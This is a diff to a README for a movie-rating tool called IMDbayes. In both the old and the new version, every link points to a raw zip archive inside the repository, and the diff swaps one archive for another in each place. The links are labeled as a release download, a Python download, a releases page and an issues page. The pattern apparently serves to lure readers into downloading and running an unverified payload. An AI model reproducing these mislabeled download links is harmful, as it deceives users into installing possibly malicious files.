@@ -1,7 +1,7 @@
 # 🎥 IMDbayes - Discover Movies Beyond Average Ratings
 
 ## 📦 Download the Latest Release
-[![Download Latest Release](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip%https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip)](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip)
+[![Download Latest Release](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip%https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip)](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip)
 
 ## 🚀 Getting Started
 IMDbayes helps you find movies that deserve your attention. By using advanced statistical methods like Bayesian Averages and 99th Percentile metrics, we analyze raw IMDb data. This way, you can identify the "Safe Bets" and the "Hidden Gems" among countless movies.
@@ -17,11 +17,11 @@ To use IMDbayes, you need the following:
 - **Operating System:** Windows 10 or later, MacOS 10.15 or later, or Linux (any major distribution).
 - **RAM:** At least 4 GB recommended.
 - **Storage:** Minimum 100 MB of free space.
-- **Python Installation:** Ensure Python (version 3.7 or later) is installed on your system. You can download Python from [https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip).
+- **Python Installation:** Ensure Python (version 3.7 or later) is installed on your system. You can download Python from [https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip).
 
 ## 💾 Download & Install
 To download IMDbayes:
-1. **Visit the Download Page:** Go to the [IMDbayes Releases Page](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip).
+1. **Visit the Download Page:** Go to the [IMDbayes Releases Page](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip).
 2. **Select the Latest Version:** Look for the latest version marked as “Latest Release.”
 3. **Download the Installer:** Click on the appropriate installer for your operating system. It should automatically start downloading.
 4. **Run the Installer:**
@@ -49,7 +49,7 @@ If you encounter any issues while using IMDbayes:
 - **Reinstall the App:** If problems persist, try reinstalling the application.
 
 ## 🌐 Support and Contributions
-We welcome support and contributions! If you find a bug or have suggestions for improvements, please open an issue on the [GitHub page](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/notebooks/IM-Dbayes-v2.6.zip). You can also contribute code by submitting a pull request.
+We welcome support and contributions! If you find a bug or have suggestions for improvements, please open an issue on the [GitHub page](https://github.com/asrafulislam17/IMDbayes/raw/refs/heads/main/src/Dbayes-IM-v1.5-beta.4.zip). You can also contribute code by submitting a pull request.
 
 ## 🔗 Additional Resources
 - **Documentation:** For detailed documentation, check the wiki on this GitHub repository.
